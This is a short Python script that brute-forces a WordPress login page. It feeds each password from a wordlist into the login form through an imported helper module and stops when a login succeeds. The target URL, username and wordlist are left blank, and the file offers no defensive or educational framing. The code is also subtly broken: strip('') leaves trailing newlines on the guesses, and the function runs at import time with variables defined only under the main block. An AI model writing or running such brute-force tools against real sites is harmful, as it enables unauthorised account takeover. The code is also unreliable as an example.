import tools.wplogin


if __name__ == "__main__":
    url = ""
    username = ""
    wordlist = ""


def brute_wp_login():
    bl = tools.wplogin.BruteLogin(username, wordlist, url)
    with open(wordlist, 'r') as file:
        for line in file:
            stripped_line = line.strip('')
            bl.fill_form(stripped_line)
            if bl.submit_form(stripped_line):
                break # break if True (password found!)


brute_wp_login()